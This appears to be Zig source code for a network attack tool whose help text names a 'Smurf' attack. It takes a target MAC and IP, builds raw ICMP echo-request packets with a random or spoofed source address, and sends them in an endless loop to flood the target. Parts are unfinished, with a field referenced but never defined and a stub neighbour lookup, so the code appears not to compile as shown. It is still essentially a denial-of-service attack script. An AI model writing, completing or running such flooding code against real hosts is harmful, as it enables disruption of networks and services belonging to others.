const std = @import("std");

const clap = @import("clap");

const etherStruct = @import("etherStruct.zig");
const addrParse = @import("AddrParse");
const ArpMap = @import("ArpMap.zig");

const Allocator = std.mem.Allocator;

const ipAndMac = struct { address: u32, mac: u48 };

const AttackOptions = struct {
    mac: ?[]const u8,
    address: ?[]const u8,
    pub fn init(res: anytype) AttackOptions {
        return AttackOptions{
            .mac = res.args.mac,
            .address = res.args.address,
        };
    }
};

pub fn main() anyerror!void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const params = comptime clap.parseParamsComptime(
        \\-h, --help             specify target's MAC & IP, specify the attack type
        \\                       ping MAC/IP address's can be randomm or peers
        \\                       Default: Smurf w/ peers
        \\-m, --mac <STR>        Target's MAC address
        \\-a, --address <STR>    Target's IP address
    );

    const parsers = comptime .{
        .STR = clap.parsers.string,
    };

    var diag = clap.Diagnostic{};
    var res = clap.parse(clap.Help, &params, parsers, .{
        .diagnostic = &diag,
        .allocator = gpa.allocator(),
    }) catch |err| {
        diag.report(std.io.getStdErr().writer(), err) catch {};
        return err;
    };
    defer res.deinit();
    if (res.args.help != 0) {
        return clap.help(std.io.getStdErr().writer(), clap.Help, &params, .{});
    }
    const options = AttackOptions.init(res);
    var arpmap = ArpMap.ArpMap.init(allocator) catch |err| return err;

    arpmap.printArpIPMACs();
    return sendLoop(&options);
}

fn sendLoop(opt: *const AttackOptions) !void {
    const sock = std.os.socket(std.os.AF.INET, //
        std.os.SOCK.RAW, std.os.IPPROTO.ICMP) catch |err| {
        std.debug.print("error:{s} unable to open socket\n", .{@errorName(err)});
        return;
    };
    defer std.os.close(sock);
    errdefer std.os.close(sock);

    const dest: std.os.sockaddr.in = .{
        .port = 0,
        .addr = @byteSwap(addrParse.parseIpv4(opt.address.?) catch |err| {
            std.debug.print("parse error:{s}\n", .{@errorName(err)});
            return;
        }),
    };
    std.debug.print("addr {x}\n", .{dest.addr});
    var buf = [_]u8{0x0} ** (@sizeOf(etherStruct.ethFrame) //
    + @sizeOf(etherStruct.ipHeader) //
    + @sizeOf(etherStruct.ping));

    var eth = etherStruct.ethFrame{
        .dst = randomMAC(),
        .src = 0x0,
        .type = 0x0800,
    };

    std.mem.copy(u8, &buf, etherStruct.toBytes(etherStruct.ethFrame, &eth));

    var ipheader = etherStruct.ipHeader{
        .LengthAndVersion = 0x45,
        .prioAndTOS = 0x0,
        .totalLength = 0x54,
        .identification = 0x7C56,
        .flagAndOffset = 0x4000,
        .ttl = 0x40,
        .protocol = 0x1,
        .checksum = 0x0,
        .src = if (opt.random) randomAddress() else useArpNeigh(),
        .dst = dest.addr,
    };

    std.mem.copy(u8, buf[@bitSizeOf(etherStruct.ethFrame) / 8 ..], etherStruct.toBytes(etherStruct.ipHeader, &ipheader));

    var pingPayload = etherStruct.ping{
        .type = 0x8,
        .code = 0x0,
        .checksum = 0x0,
        .identifier = 0x1234,
        .seqNum = 9999,
        .timeStamp = 0x0,
    };
    std.mem.copy(u8, //
        buf[(@bitSizeOf(etherStruct.ethFrame) + //
        @bitSizeOf(etherStruct.ipHeader)) / 8 ..], //
        etherStruct.toBytes(etherStruct.ping, &pingPayload));
    for (buf, 1..) |byte, i| {
        std.debug.print("{x} ", .{byte});
        if (i > 0) {
            if (i % 8 == 0) {
                std.debug.print(" ", .{});
            }
            if (i % 16 == 0) {
                std.debug.print("\n", .{});
            }
        }
    }
    std.debug.print("\n", .{});
    while (true) {
        if (std.os.sendto(sock, &buf, 0, //
            @as(*const std.os.sockaddr, @ptrCast(&dest)), //
            @sizeOf(std.os.sockaddr))) |sentBytes|
        {
            std.debug.print("Sent {} Bytes\n", .{sentBytes});
        } else |err| {
            std.debug.print("Sendto error {s}\n", .{@errorName(err)});
        }
    }
}

fn optionsToEther(opts: AttackOptions, ipMacs: ArpMap.ArpMap) !etherStruct.ethFrame {
    return .{
        // use find Mac from ArpMap
        .dst = ipMacs.findMac(opts.address),
        .src = randomMAC(),
        .type = 0x0800,
    };
}

fn randomMAC() u48 {
    const RndGen = std.rand.DefaultPrng;
    var rnd = RndGen.init(0);
    return rnd.random().int(u48);
}

fn randomAddress() u32 {
    const RndGen = std.rand.DefaultPrng;
    var rnd = RndGen.init(0);
    return rnd.random().int(u32);
}

fn useArpNeigh() u32 {
    return 0;
}
